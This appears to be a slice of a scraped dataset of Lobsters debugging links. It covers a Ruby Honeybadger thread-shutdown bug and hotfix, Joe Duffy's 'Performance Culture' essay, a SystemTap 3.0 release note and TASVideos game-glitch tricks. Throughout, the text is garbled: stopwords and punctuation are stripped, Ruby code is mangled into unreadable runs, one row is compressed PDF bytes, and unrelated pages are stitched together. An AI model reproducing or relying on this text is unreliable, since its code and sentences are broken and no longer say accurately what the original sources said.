block stop shuutting worker trace block stop shut worker trace block stop shuutting worker metric block stop shut worker metric block stop stopping agent ensure run second time stopping agent appears log exactly second digging honeybadger code guess remembered reading honeybadger codebase def initialize config config config delay configdebug delay used inside work method def run loop work rescue exception e error msg error agent thread shutting class message snt sprintf msg eclass emessagedump array ebacktrace join nt ensure sprintf stopping agent end def work flushmetrics metricsflush flushtraces tracesflush rescue standarderror e error msg error agent thread class message snt sprintf msg eclass emessagedump array ebacktrace join nt ensure sleep delay end work method called inside run method honeybadger scheduling separate thread def start mutexsynchronize return false unless pid return true thread threadalive debug starting agent pid processpid thread threadnew run end true end ok thread running sometimes sleep would affect u would matter ruby main thread finish care thread running also honeybadger threadjoin point wait thread anything opposite check killing thread atexit stop config senddataatexit end def stop force false debug stopping agent mutexsynchronize pid nil end kill collector threadkill thread thread unless force flushtraces flushmetrics end workerseachpair key worker workersend force shutdown shutdown end true end epiphany point realized fact somehow missing attention two case happen inside work method imagine exception sleep def work flushmetrics metricsflush flushtraces tracesflush rescue standarderror e error msg error agent thread class message snt sprintf msg eclass emessagedump array ebacktrace join nt ensure sleep delay exception end would happen would quit ensure block exception would bubble easy harmless scenario happens exception happens inside one flush method def work flushmetrics metricsflush exception flushtraces tracesflush rescue standarderror e error msg error agent thread class message snt sprintf msg eclass emessagedump array ebacktrace join nt ensure sleep delay end land inside ensure block sleep interesting revelation seemed important similar might randomly happen real life race condition action thread killed like exception ruby code still could find ruby code would actually wait thread everything pointed something indeed wait bring ruby witness decided create small piece ruby code similar honeybadger convince ruby guilty clearly missing something cause whole situation occur wrote require securerandom class mythread thread end def delay end def run loop work rescue exception e put timenow exception ensure put timenow stopping agent end def work put timenow start work securerandomhex put finished work rescue standarderror e put timenow error ensure put timenow start sleep sleep delay put timenow finished sleep end mythreadnew run atexit put timenow killing thread threadkill put timenow killed thread end sleep exit securerandomhex take second wait main thread trying exit whole program output start work killing thread killed thread stopping agent well nothing interesting obviously right ruby wait thread finish program stopped second else would expect never know let execute start work killing thread killed thread start sleep finished sleep stopping agent problem reproduced time ruby waited thread finish waited sleep delay inside ensure block see coming able randomly cause behavior ruby well behavior program nondeterministic sometimes wait sometimes hotfixing sure missed code honeybadger far unknown reason ruby wait thread finish time hotfix problem knew could use senddataatexit config omit problem want exception background job logged since exception job immediately finish quits afraid would miss wanted dig root problem find fix workaround would let u still send last data program quits simple hotfix skip sleep phase thread aborting state killed threadkill honeybadger version raise upgraded gem check hotfix still applies identical way might changed work method body end honeybadger agentclasseval def work flushmetrics metricsflush flushtraces tracesflush rescue standarderror e error msg error agent thread class message snt sprintf msg eclass emessagedump array ebacktrace join nt ensure sleep delay unless threadcurrentstatus aborting unless hotfix end end notified honeybadger resque ruby team problem hope come good coldfix result spectacular effect visible immediately metric remaining job processed much much faster hotfix deployment cpu usage became much higher utility machine time processing spike suspect improvement even able decommission learn like article find rail book interesting well especially recommend responsible rail contains story like resource
588,Lobsters,debugging,Debugging,Linus hacks fsck to recover deleted files (1993),https://groups.google.com/forum/#!searchin/alt.hackers/Linus|sort:relevance/alt.hackers/yxLsw4a4d3E/wWp_h7C2bjkJ,linus hack fsck recover deleted file,,use google group discussion please enable javascript browser setting refresh page
589,Lobsters,debugging,Debugging,The Linux Scheduler: a Decade of Wasted Cores,http://www.ece.ubc.ca/~sasha/papers/eurosys16-final29.pdf,linux scheduler decade wasted core,,obj length filter flatedecode stream xڵ l v l l u z n taq gl vܨe l n ݘ p fr endstream endobj obj length filter flatedecode stream xڍ н v g fd q qc zy v q ac q w
590,Lobsters,debugging,Debugging,Performance Culture,http://joeduffyblog.com/2016/04/10/performance-culture/,performance culture,performance culture introduction midori diagnosis cure start end culture dialogue buzz communication intellectual dishonesty management carrot fewer stick slow speed process infrastructure test ring techempower measurement metric statistic statsd standard deviation coefficient variation cv geomean goal baseline bloom filter key performance indicator kpis summary,essay talk performance culture performance one key pillar software engineering something hard right sometimes even difficult recognize famous judge said know see spoken length performance culture independently however intersection two thing get interesting team well performance ingrained nearly aspect team operates start able proactively deliver loveable customer experience crush competition easy cookiecutter recipe achieving good performance culture however certainly best practice follow plant requisite seed team let go introduction big focus performance anyway partly background worked system runtimes compiler thing customer expect fast always much easier incorporate goal metric team process outset project compared attempting recover later also worked many team done amazing done terribly many one universal truth differentiating factor always culture partly matter kind software performance almost always worse customer would like simple matter physic impossible speed aspect program given finite time tradeoff involved size speed functionality firmly believe average team spend way le attention developing rigorous performance culture heard performance top priority u statement many time later canceled painful realization without product succeed partly top mind u devdiv focus net core performance aspnet scalability integrating performancemotivated feature c library making visual studio faster particularly top mind comparing experience midori heavily inspired blog post diagnosis cure tell whether performance culture track well sign answering question product key performance metric difficult performance often regress team member either know care find late act blame one common response performance problem either people infrastructure performance test swing wildly trusted generally ignored team performance something one individual meant keep eye instead whole team performance issue production common require ugly scramble address andor reproduced may sound like technical problem may come surprise however primarily human problem solution easy especially culture weed always easier dig hole first place climb one later first rule hole stop digging cultural transformation must start top management taking active role performance asking question seeking insight demanding rigor simultaneously come bottom engineer actively seeking understand performance code writing ruthlessly taking zerotolerance stance regression everselfcritical lookout proactive improvement essay describe way ensure sort culture addition best practice found help increase effectiveness one place lot may seem obvious believe pretty rare see everything working harmony practice wow difference make quick note os software wrote essay perspective commercial software development see word management lot many principle work os like anytime see management mentally transform management project committers start end culture key component healthy performance culture performance part daily dialogue buzz within team everybody play role management must care truly superficially good performance understand take engineer take scientific datadriven inquisitive approach performance measure measure measure robust engineering system place track goal past present performance block regression spend bit time talking roughly turn dialogue buzz communication entire team need hook performance many team seen go wrong single person anointed goto performance guy gal fine help team scale useful someone need spearhead investigation vocal advocate performance great must come expense rest team involvement lead problem similar microsoft use test discipline engineer learned bad habit outsourcing basic quality code assuming someone else would catch problem arise risk present central performance czar engineer team write performance test proactively benchmark profile ask question competitive standing product generally thing need engineer build healthy performance culture magical thing happen whole team obsessed performance hallway abuzz excitement news challenge improvement spread organically see martin hashtable rebalancing change reduced process footprint jared checked feature let stack allocate array thinking hacking networking stack weekend use care join impromptu whiteboard session offthecuff ideation group learning really awesome see excitement desire win propels team forward naturally without relying heavyweight management stick hate blame hate defensiveness number one rule jerk naturally critique must delivered constructive respectful way found high occurrence blame defensiveness intellectual dishonesty team poorly performance however like jerk toxic team culture must weeded aggressively easily make break ability develop right performance culture nothing wrong saying need better key metric especially good idea addition adhoc communication course need structured communication also describe technique later getting core group people room regularly discus past present future performance particular area product essential although organic conversation powerful everyone get busy important schedule time reminder keep pushing ahead management carrot fewer stick every team poor performance culture management fault period end conversation engineer must make difference course person top everybody deeply involved budgeting necessary time rewarding work superstar right culture take hold single engineer alone possibly infuse enough culture entire team certainly entire effort running upstream management team painful watch manager appreciate performance culture often get caught surprise realize worse think engineering work predict performance matter advance customer complain product perform expected key area realizing late preventative measure manager whose team poor performance culture start blaming thing guess blame game culture spread like wildfire engineer start accountability go window blame solve anything blaming jerk notice said management must deeply involved superficial level involvement sure chart green red trendlines probably need floating around regular review important suppose could say pointyhaired manager thing believe however help manager must go deeper however proactively regularly reviewing state performance across product alongside basic quality metric progress feature core tenet way team work must treated manager must wonder competitive landscape ask team good insightful question get thinking performance come free cost team forcing slow time spend energy thing cranking feature hence requires amount intelligent tradeoff much really depends scenario manager need coach team spend right ratio time assume come free usually end spending amount would taken inopportune time later eg endgame shipping product production trying scale customer etc mentor mine used say get team reward especially true performance engineering system surrounding consider two manager manager give lip service performance culture however pack every sprint schedule steady stream feature got crush competitor z must reach feature parity time break inbetween spends allhands team meeting praising new feature demo aplenty even give reward engineer one groundbreaking feature result team crank feature impressive clip delivers fresh demo board every single time give sale team plenty ammo pursue new lead performance gate engineer generally bother think much manager b take balanced approach belief given competitive landscape need impress customer board member whizbang demo new feature need keep coming also wary building much debt area like performance reliability quality area expects stick intentionally put foot brake push team hard area feature demand good engineering system live flighting new feature performance telemetry builtin example requires hold board member product manager bay definitely unpopular difficult addition reward groundbreaking feature award allhands show chart performance progress delivers performance ninja award engineer delivered impactful performance improvement note engineering system improvement also qualify manager think going ship quality product time customer love money manager b sometimes got slow speed microsoft undergoing two interesting transition recently related point one hand elimination test discipline mentioned earlier hand renewed focus engineering system bumpy ride surprisingly one biggest hurdle get individual engineer manager development manager old model got used focusing feature feature feature left engineering system work contractor quality work tester result illprepared recognize reward kind work essential building great performance culture result guessed total lack performance culture subtly also ended leadership hole recently virtually highranking engineer working missioncritical engineering system make entire team productive capable want make career mere grunt work assigned contractor underappreciated management get reward early prototyping know code going survive temptation spend zero time performance hacking away towards minimum viable product mvp startup burning cash understandable strongly advise architecture matter poorly made architectural decision made outset lay foundation entire skyscraper illperforming code atop better make performance part feasibility study early exploration finally tie everything manager large team think important get together regularly every sprint two review performance progress management team addition finegrained engineer lead architect level powwow happen continuously bit stick aspect review celebrating team selfdriven accomplishment keeping management radar review driven lab manually generated number outlawed brings process infrastructure process infrastructure boring good infrastructure must team lacking cultural trait even stop invest infrastructure simply live infuriating lack rigor good process must ensure effective use infrastructure bare minimum book commits must pas set gated performance test beforehand commits slip past regress performance reverted without question call zero tolerance rule continuous performance telemetry reported lab flighting live environment implies performance test infrastructure important characteristic noisy measure right thing run reasonable amount time saying automated dead highlight importance good infrastructure avoids dreaded worked fine computer everybody sure encountered test run random machine know circumstance quoted declare success find time later result hold countless possibility perhaps noisy process interfered like antivirus search indexing application operating system update maybe developer accidentally left music playing background multimedia player maybe bios properly adjusted disable dynamic clock scaling perhaps due innocent dataentry error copyandpasting number spreadhseet maybe number two comparison benchmark came two incomparable machine configuration seen happen practice manual human activity mistake happen day literally refuse look trust number come lab solution automate everything focus energy making automation infrastructure damned good possible pay best people make rock solid rest team encourage everybody team fix broken window take proactive approach improving infrastructure reward heartily might go little slower worth trust test ring glossed fair bit said commits must pas set performance test went talk checkin might slip past said test possible reality usually possible run test find problem commit go least within reasonable amount time good performance engineering system balance productivity speedy codeflow productivity assurance regression prevention decent approach organize test socalled ring inner ring containing test developer team measure commit inner ring containing test developer particular subteam measure commit inner ring containing test developer run discretion commit number successive ring outside gate codeflow point branch postcommit testing nightly weekly etc based timeresource constraint prerelease verification postrelease telemetry monitoring see bit flexibility get structured practice wish could lie say science however art requires intelligently trading many factor constant source debate one management team actively involved small team might settle one standard set benchmark across whole team larger team might need split inner ring test along branching line matter size would expect mastermain branch enforce important performance metric whole team ensuring code ever flow damage core scenario case might leave running certain precommit test developer discretion note mean running precommit test altogether optional particular set might case example test covered lesserused component know nightly test would catch postcommit regression general strong performance culture okay trust judgement call sometimes trust verify let take concrete example performance test often range micro macro size typically range easier harder pinpoint source regression respectively micro measure one thing fluctuation tend easier understand whereas macro measure entire system fluctuation tend take bit elbow grease track web server team might include range micro macro test innermost precommit suite test number byte allocated per request micro request response time micro perhaps half dozen microtomidpoint benchmark techempower macro let say thanks lab resource test parallelism awesomeness github webhooks let say complete minute nicely integrated pull request code review process bad clearly perfect coverage maybe every night techempower run hour measure performance longer period time identify leak possible developer could pas precommit test fail longer test course hence team let developer run test ondemand good doobie avoid getting egg face ala mistake happen culture blame witchhunting lead back zero tolerance rule barring exceptional circumstance regression backed immediately team seen succeed question asked iou soon relax stance culture begin break layer regression pile top one another end ceding ground permanently matter best intention team commit undone developer identify root cause remedy ideally write new test appropriate go hoop submit checkin time ensuring good performance measurement metric statistic decent engineer intuit good engineer measure great engineer measure though put metric two distinct category consumption metric directly measure resource consumed running test observational metric measure outcome running test observationally using metric outside system example consumption metric hardware performance counter instruction retired data cache miss instruction cache miss tlb miss andor context switch software performance counter also good candidate like number io memory allocated collected interrupt andor number syscalls example observational metric include elapsed time cost running test billed cloud provider clearly important different reason seeing team measure time time alone literally brings tear good measure enduser see therefore make good highlevel test however seriously lacking insight give visibility variance borderline useless consumption metric obviously much helpful engineer trying understand something changed web server team example imagine request response time regressed test report tell u time true developer try reproduce scenario locally manually narrow cause however tedious take time likely imperfect due difference lab versus local hardware instead instruction retired memory allocated reported alongside regression time could easy see suddenly memory allocated per request aware recent commits could make easy engineer quickly pinpoint back culprit timely manner additional commits pile top obscuring problem like printf debugging speaking printf debugging telemetry essential longrunning test even lowtech approach like printfing current set metric every often eg every second help track something went weed simply inspecting database logfile imagine trying figure web server test went rail around hour mark utterly maddening without continuous telemetry course also good idea go beyond product builtin way collect telemtry wild correlate back key metric statsd fantastic option finally important measure metric scientifically possible includes tracking standard deviation coefficient variation cv geomean using ensure test vary wildly one run next hint commits tank cv blocked tank core metric statistic wonk team also good idea goal baseline little matter lack goal baseline benchmarkmetric pair recommend recognizing four distinct concept infrastructure process current current performance span multiple metric baseline threshold product must stay abovebelow otherwise test fail sprint goal team must get current sprint end ship goal team must get order ship competitive featurescenario assume metric higher better like throughput usually case ship goal sprint goal current baseline win loss happen continual adjustment made example baseline ratcheting process necessary lock improvement reasonable approach ratchet baseline automatically within percentage current performance ideally based standard deviation andor cv another approach require developer manually ratcheting intentional accounted interestingly may find helpful ratchet direction block commits improve performance dramatically yet ratchet baseline force engineer stop think whether performance change intentional even good one aka confirm kill course common sprint goal remain stable one sprint next number improving time system also help ensure team backslide prior achievement found useful organize sprint goal behind theme make sprint server performance shake excessive allocation something else give team sense cohesion shared purpose add little fun mix manager often forget important fun turn performance greatest fun hugely measurable engineer love speaking hell time pull scythe start whacking away even time learn team even try fun new algorithmic technique like bloom filter every performance test need level rigor important enough automatically run precommit certainly demand probably run daily monthly managing goal baseline whatnot get really cumbersome many real risk especially tracking multiple metric benchmark idea key performance indicator kpis becomes important performance metric important enough track management level whole team healthy overall product given time past team built operating system component included thing like process startup time web server throughput browser performance standard industry benchmark number frame dropped realtime audiovideo client including multiple metric apiece plus abovementioned statistic metric course regularly running pre postcommit test suite rolling one place tracking goal hugely focusing exercise summary post scratch surface good performance engineering hope walk away least one thing performance well great performance culture culture need infused throughout entire organization management engineer everybody need transparent respectful aggressive datadriven selfcritical relentlessly ambitious great infrastructure supporting process must management need appreciate reward would feature work frequently even selfreinforcing flywheel get going setting goal communicating regularly obsessively tracking goal customerfacing metric paramount easy everything written article honestly difficult remember slow disciplined area easy trick thinking running fast possible worrying performance later right call well sorry tell sometimes got use intuition gut however experience tend undervalue performance considerably compared feature manager team thank instilling culture like rewarded shipping better performing software schedule engineer guarantee spend far le time scrambling time proactive time fun team obsessed customer performance love hear think experience establishing performance culture
592,Lobsters,debugging,Debugging,systemtap 3.0 released,https://lwn.net/Articles/681527/,systemtap released,article http sourcewareorgsystemtap http http kojifedoraprojectorgkojipackageinfo packageid http sourcewareorggit psystemtapgit atree http sourcewareorgsystemtapwiki http tinyurl http http sourcewareorgpr,frank ch eigler fche redhatcom systemtap sourcewareorg subject systemtap release date sun mar messageid redhatcom cc linuxkernel vgerkernelorg lwn lwnnet archivelink article systemtap team announces release experimental monitor interactive mode optimized associative array two type function overloading probe point bracepattern expansion security bandaid sample improved string quoting escaping pretty printing array aggregate private scoping variable function oxford comma much get http sourcewareorgsystemtap project page http http kojifedoraprojectorgkojipackageinfo packageid git tag commit commits since last release bug fixed feature added since last release build see readme news file http sourcewareorggit psystemtapgit atree information http sourcewareorgsystemtapwiki systemtap frontend stap change new experimental interactive mode specified stap drop commandline prompt build script run edit run etc type help list command new experimental monitor interval option similar unix top allows user see statistic running module uptime module name invoker uid memory size global variable current probe list along statistic interface also provided allow control running module resetting global variable sorting list probe deactivating reactivating probe add macro print print scalar aggregate variable print print array aggregate given indexarity formatted similarly automatic printing writtenonly global variable global b probe oneshot b tid probe end print b add czech version key manual page stap compile server log stap client option passed server option get logged server include script name e script depending used client systemtap script language change performance associative array dramatically improved especially densely filled table multiple index hash table behind array sized function array maximum size optional maphashbias spacetime tradeoff knob function may overloaded module runtime using next statement script function stapnext macro embeddedc function may also overloaded number parameter compile time example runtime overloading function f condition next print first function function f stapnext print second function function f print third function given function functioncall f execute body third function condition evaluates true print third function note second function unconditionally nexted parameter overloading function g print first function function g x print second function g first function g second function note runtime overloading occur example number parameter function differ use next statement inside function overload remain trigger runtime exception function candidate selected compile time determined number argument provided functioncall embeddedc function block may access script level global variable using stapglobalget stapglobalset macro read write script global var pragma read var pragma write var marker must placed embeddedc function block written type must match type inferred script level scalar stapglobalsetvar stapglobalgetvar increment script global var stapglobalsetvar hello associative array stapglobalgetvar indexn stapglobalsetvar indexn new value probe point brace expansion supported improve brevity specifying probe point example process function function b call return processfunction processfunction b call processfunction b return process function callees plt processfunction callees processplt kernel module nfs function nfs kernelfunction nfs module nfs function nfs profiling timer arbitrary frequency provided perf probe support frequency field alternative sampling count probe timerprofilefreqhz n probe perftype n config hz x specified frequency accurate around may need provide higher value achieve desired rate added support private global variable private function private keyword limit tapset file defined systemtap tapset change ansistp function ansisetcolor replaced overloaded ansisetcolor linux arm auxsyscallsstp support arm kernel le linuxarm nd syscallsstp support nd syscallexecve arm kernel le linuxauxsyscallsstp new function convert syscall flag string linuxcontextstp new modulesize function linuxconversionsstp new kernelstringquotedutf function combine stringquoted kernelstringutf kernelstring function alternative error string replaced overloaded variant linuxndsyscallsstp add kprobe based probe point linuxperfstp update recent uapilinuxperfeventh bit linuxprocmemstp procmem pid function replaced overloaded procmem linuxsyscallsstp add kernel function probe point linuxtaskstp new taskcwdpath taskexefile function linuxtasktimestp task u timetid function replaced overloaded task u time linuxuconversionsstp userstring function alternative warning string replaced overloaded variant loggingstp new overloaded variant assert assert expression printstatsstpm print macro printing stats timersstp probe point timerprofilefreq profiling tryassignstpm new tryassign macro uconversionsstp add userstringquotedutf function quote given utf string given user address internal tapset function global variable marked private possible tapsets modified make use new function overloading feature instead new function name suffix pid indicate extra argument function seem optional argument new tapset function stringquoted quote escape general string string context variable prettyprinted processed quotation engine falling back x hex pointer error function getmmapargs got deprecated systemtap sample script sample whosentitstp trace outgoing network packet using netfilter probe printing source thread nameid destination host port new collection selection security band aid specific cf historical emergency security bandaids referenceeducation script found securitybandaids folder example directory number sample tweaked portability demonstration newer languagetapset facility example tested kernel version rhel rhel rhel fedora fedora fedora rawhide known issue release kernel crash continue reported script probe broad kernel function wildcards dyninst backend still much prototype number issue limitation general teething woe see dyninstreadme systemtapdyninst bugzilla component http tinyurl comstapdynprlist want gory detail state feature upstream kernel commit put fnovartrackingassignments kcflags reducing debuginfo quality cause debuginfo failure proposed workaround issue exists http fedora kernel affected issue contributor release abegail jakop david smith felix lu frank ch eigler jesper brouer jonathan lebon josh stone ken raeburn lukas berk mark wielaard martin cermak nan xiao nikolay borisov orivej desh stan cox torsten polle william cohen zhou wenjian special thanks new contributor marked special thanks abegail compiling note bug fixed release http sourcewareorgpr need utrace taskfinderbased pid execname pid cwdpathname table incorrect resolution variable function scope share global variable embedded c script need way protect sensitive tapset globals intratapset visibility scoping embeddedc function missing return value reported robust rt support limit size request compile server client log stap option local variable name collision timerprofile nnn variant using perf probe embeddedc function various tapsets stress tested char always printed possibly unknown without address relay hostguest functionality broken allow brace expansion probe point javaexp error attach module control channel sensitive duplicate globals across tapset file trycatch statement tapset function add returnprobe variant callee runtime function overloading facility new monitor option need assert constfolded literal get unnecessary tmp storage lost ability probe kernel module initializers kbuild warning testsuite result hard compare private keyword tapsets kprobemodule mod function foo nt work loaded module v userstringnquotedexp null global variable breakage systemtap fails start offline finding outoftree kernel module work full path relative path staprun testsuite function nt handle unexpected output rhel crash checkexp escape xml documentation netfilter probe broken rawhide translator put two probe probe point libraryexp test systemtap ca nt find certain kernel tracepoints processbypidexp always fails arch nt support plt probe linux commit extend documentation overview private keyword support made output le useful private keyword support made error message le useful script nt finish bulk mode kretprobe datapouch type issue parseoksemkostp test case always fails flight recorder mode intermittently fails parallelexecexp fails beakerprojectorg linux commit support dash binsh generated makefile linux commit stap tmpdir leaf useless tempdirs behind deleting array aggregate unreliable bad hash value distribution horrible performance large array stptarget misdirected pidnamespace container monitor mode cause kernel crash exited immediately entering c interactive mode prompt prevents script running staprun nosuchfile c cmd imperfect cleanup
593,Lobsters,debugging,Debugging,TASVideos / Game Resources / Common Tricks,http://tasvideos.org/GameResources/CommonTricks.html,tasvideos game resource common trick,finding unintended thing abuse abusing untested code todo battletoads abusing erroneous assumption super mario bros rygar kid chameleon solomon key flashback abusing sideeffects pause mega man mega man overlapping different game logic carring enemy bos room pulling bos regular level restarting level rockman ta monster damage abuse monster damage boost abuse king kong super castlevania legend zelda link awakening kirby superstar symphony night adventure island frame window abuse invulnerability abuse event invulnerability abuse little nemo gremlin umihara kawase wrath black manta mega man stun invulnerability abuse mega man blaster master goony castlevania circle moon avoid countdown extraordinary gameplay abusing death game super c us death save time todo avoiding saving turn autosaving todo reset game keep sram reset game mind sram input abuse two action zelda alttp zelda shining soul ii frame window abuse castlevania harmony dissonance blaster master pokémon red todo alternating button super speed abuse sonic advance simon quest super metroid outrun game camera fast motion collision abuse gradius collision abuse close approach collision abuse solomon key diagonal movement tile http wwwyoutubecomwatch collision abuse mega man mega man jumping ledge memory search subpixel carryover subpixel inheritance luck manipulation luck manipulation lag reduction memory search corrupt memory save data game option todo text speed movementbattle animation demo cutscenes difficulty level autosave date time luck manipulation user profile study existing material examine game data read program random number generator reverse engineering read script examine level data examine data table try thing,sparring program similar programmed reality matrix basic rule rule like gravity must learn rule different rule computer system bent others broken morpheus matrix several trick used least tried many game improve time making movie sure try every one otherwise try finding table content expand collapse unintended thing abuse abusing untested code todo untested code untested code primary source game glitch untested code always helpful example battletoads one level impossible complete two player game tester never actually tried level two player game published containing serious programming error prevents second player moving resulting immediate death clingerwingers level abusing erroneous assumption due limited processing power old console game often make erroneous assumption reduce number calculation game make sometimes error result programmer oversight many interesting example exist super mario bros game assumes standing enemy close enough top jump right spot next enemy ground flag set jump midair video right show rygar game assumes standing ground ducking walk duck small interval walk cliff without falling kid chameleon solomon key game assume standing ground every time level start thus allowing action midair start level jumping attacking flashback game assumes collected item previous level even case due warping also applies prince persia game abusing sideeffects pause game pausing unintended sideeffects due programmer oversight mega man pausing suspends bullet keep temporary invulnerability timer running allowing shot hit target multiple time pause target hit example right show mega man pausing reset vertical acceleration used lessen effect gravity perfom extra wide jump game timer counter continue change paused period might allow certain type luck manipulation sometimes might even cause timer counter overflowunderflow lead useful consequence game pausing creates sound effect momentarily disables sound channel music scene synchronized music using pause may break scene way might worthwhile observe anomaly caused pausing game overlapping different game logic carring enemy bos room pulling bos regular level may overlap basic logic ram value correct separately mix sometimes give birth new object routine restarting level basic flag set one set common sense along first one unset sometimes also spawn wrong object give access ram bank switching abuse glitch normal nmi routine use value one game cicle fill address ruling another cicle exactly happens rockman ta call level end wrong time monster damage abuse monster damage boost abuse common game designed character ca nt reach certain path platform barely designer often overlook boost monster provide hit getting hurt right place right time get monster boost place normally nt able go case taking damage sends character direction neglecting obstruction due oversight developer abused creating unintended shortcut king kong example taking damage go gate final part game case taking damage powerful attack fling character speed faster normal planned send character direction desired save time super castlevania legend zelda link awakening kirby superstar example symphony night example taking speed boost height boost distance boost resulted damage case damage cause character retain speed long nt stop video example adventure island character able retain super speed boost strikingly long period time see also frame window abuse invulnerability abuse game contain situation character immune harm event invulnerability abuse often game started scripted demo may interrupted like animation finishing level character becomes invulnerable touch something lethal state game game may well ignore little nemo gremlin movie example many game umihara kawase wrath black manta lethal object collision check ignored entering door mega man check ignored changing weapon stun invulnerability abuse many game take damage flicker temporarily become invulnerable prevent immediately taking damage invulnerability often protect instant death hazard example allowing safely walk deadly spike lava duration flickering mega man blaster master movie example may also advantageous use period invulnerability pas monster would otherwise take longer destroy pas nearby monster would damage goony movie example former castlevania circle moon movie example latter avoid countdown game often end level score count screen time spent screen count well minimized causing underlaying value optimal possible without losing speed usually mean avoiding collect item correct amount health end level extraordinary gameplay abusing death game may seem contradictory goal thing fast possible game commonly reset player position player dy leading possible shortcut health often also set known number may lose gain item game multiple player used change amount player interaction example dead player rpg get asked command dead party member also act form party change possibly affecting scripted event depends party multiplayer game one player may able die take advantage favorable spawning video example right demonstrates idea level super c two player continually die order spawn top screen save time abused save time submission marked category us death save time todo abusing game avoiding saving often take several second manually save game rarely needed ta movie similarly turn autosaving however many game take advantage warp back earlier position level reset character status etc load saved game recommended study consequence happen saving game todo example taking advantage saving game reset game keep sram game console reset button restart game beginning program may seem like obvious suboptimal move time faster reset game saving continuing game common example letting game save finishing level skipping following cutscene reset game mind sram writing save sensitive operation game often say nt turn console saving ignoring advice often lead corrupted save usually result corrupted save game refuse load save afterwards careful timing luck possible create corrupt save game accept loading lead major glitch subsequent sequence breaking input abuse two action try make input probably nt tested like pressing leftright updown time use multiple input device like gamepadtouchscreen simultaneously might bizarre useful consequence see zelda alttp zelda glitch run example note emulator virtuanes old version fceu nt allow press rightleft updown console qualm though usually press hard controller press two opposite direction shining soul ii duplicate item tossing moving item cursor frame frame window abuse game short period make valid game input supposed catching opportunity might either merely allow act earlier thing unintended developer castlevania harmony dissonance move right enter room open door scripted event occurs use backdash certain doorway frame window glitched warp occurs blaster master turn around right going doorway cause game warp wrong destination pokémon red game occasionally allows short window possible open menu cutscene using opportunity save restore game fly different area cause game get confused going allowing memory corruption todo another typical example different outcome alternating button often need press button dispose dialog box start game something similar two button used activate goal press like b b b b etc button effectively pressed every frame nt save actual time movie save time making movie nt need test earliest possible frame every time emulator vba let put b autofire starting different frame automatically press sequence button even le effort sometimes game actually accept next input every frame case actually save time movie compared pressing one two button early possible time also game might designed thinking possible press button fast strange thing may happen result aware hexediting may cumbersome use technique may difficult determine exact frame input affected game super speed abuse act inhumanly fast like pressing button time second might able thing game developer would never thought possible game boost speed high see sonic advance example game kill bos spawning perhaps chance complete transformation see simon quest super metroid example outrun game often catch game unprepared move extreme speed mean game may time prepare point mean practice object may created yet depending exact situation may blessing curse camera game frequently cheat updating object near enough camera somehow outrun camera might able ignore object would otherwise impede progress fast motion collision abuse game almost never interpolate motion frame mean one place one frame place next without actually traveled path like real world animation work moving fast sometimes pas object game render frame inside object combined close approach collision abuse mentioned speed may even need high example show gradius collision abuse due extreme speed ship able fly narrow piece ground would normally destroy ship collision abuse close approach collision abuse game nt pixelperfect collision check character enemy sprite graphic see onscreen unusual shape hitboxes usually actually square game programmed way much easier program character box touching enemy box program pixel character graphic touching pixel enemy graphic game hitboxes actually bigger sprite get hit enemy seems like lot game though opposite true hitboxes actually smaller sprite seemingly touch even go partially inside enemy without getting hurt solomon key movie many example diagonal movement tile game check tile character checking one point may make possible pas diagonally tile sometimes useful get past tile deadly otherwise harmful example applied jetpack http wwwyoutubecomwatch collision abuse various method pushing corner strange way getting shoved enemy may sometimes manage get embedded floor wall ceiling sometimes happens get stuck game ruined time might allow make use new route nt possible example might able gain support jump wall movie example game collision calculation simple mentioned earlier motion interpolated sometimes go enemy wall traveling fast enough along odd enough trajectory respect wall game account quickly ejecting wall prevent getting stuck sometimes trick game ejecting wrong direction wall initially walked game wall ejection move character high speed one direction usually horizontally game find place exit wall useful force game shoot high speed along desired path mega man mega man even ceiling eject horizontally author movie often perform various antic result mega man embedded ceiling image right show classic example super mario bros famous wall glitch allows entrance jumping ledge speed playable character game especially platformers nonlinear usually done form acceleration longer character move certain direction higher velocity similarly longer fall faster reach platform underneath starting point often preferable jump shortly edge platform avoid temptation running falling normally often character littletono downward velocity short period unless course need way note game drastically reduced aerial speed usually preferable short jump couple frame reaching ledge jump sure study physic game working well nt hesitate use memory search find exact value character speed subpixel carryover extremely common ne game le common platform d gba regardless platform looked game subpixel value represents fraction pixel used calculate many pixel character move frame often end levelroom remainder value cleared mean value left used next levelroom possible high value left level give character tiny head start next level note subpixel variation common source desyncs copypasting movie game subpixel carryover subpixel value aligned copypasting subpixel inheritance game often use subpixels object player character enemy game also often reuse memory used store active object object spawn despawn combine two fact sloppy initialization object inherit subpixel value whatever occupied memory subtle nudge object need exact right position luck manipulation video game console computer exactly told always give result given input nothing truly random source true randomness game game purely deterministic depend solely user input learn abuse fact affect anything element randomness like monster movement item drop read luck manipulation lag reduction processing speed old console system limited handle many object per frame many object screen one time game slows ca nt calculate everything one frame knowing cause phenomenon important making ta often lag minimized keeping number onscreen object low either destroying early perhaps destroying prevent overly complicated processor intensive death animation playing luck manipulation useful game whether monster spawn random onscreen object cause processor use action require calculation others instance close enemy collecting using certain item may cause game lag often lag happen unknown reason sometimes slightly different strategy nt cost time prevent event occurring instance memory search might help reduce corrupt memory save data game us memory know done left somehow gain ability directly edit memory effectively slipping wrong value wrong address command game arbitrary thing requires deep disassembling original game code expert knowledge game option todo example many game provide game option modify game work recommened always try see save time certain setting text speed game allow change fast text displayed fading setting text speed highest level usually save time worth trying even skip text sometimes might unable skip quickly due input limitation movementbattle animation roleplaying strategy game turn choose simplified version movementbattle animation choose fastest way demo cutscenes although likely able skip input game provides option might faster disable difficulty level general prefer movie done hardest difficulty provided demonstrate best superhuman gameplay case lower difficulty may allow even better demonstration prefer note game access extra item stage boss andor achieve hidden ending certain difficulty usually hardest one happening might interfere decided movie goal make sure investigated secret game autosave usually waste time save game ta especially automatically done everytime turn autosave option allowed otherwise avoid triggering much possible date time many game setting affect randomness game see also luck manipulation game date andor time match particular value secret game material become accessible user profile typically many limited long game featuring save load function often asked create user profile save usually contains information game character name gender birthday usually good idea keep information short possible spend least time creating profile information cited gameplay game however information profile may deterministic random effect gameplay may accordingly manipulate favourable way study existing material game walkthroughs faq forum post email letter irc remark etc find suspect game tasing engine similar another game already ta submitted check see particular trick glitch used applicable game well examine game data read program game program form intended executed game system nothing stopping reading program instead program code likely easy read exact rule game made best way understanding rule simply read figure exactly mean check exactly random number generator work simply player character supposedly move wall difficult thing recommended know program attempt normal programming lower level need actually understand instruction given processor programmer may written reverse engineering read script many game especially one plot script engine commonly control important event go somewhere enemy behave learn script engine work examine game script flaw like main program importantly allows understand option examine level data game frequently store important data right inside level definition find sort tilemap flag trigger area enemy control waste time guessing exactly thing 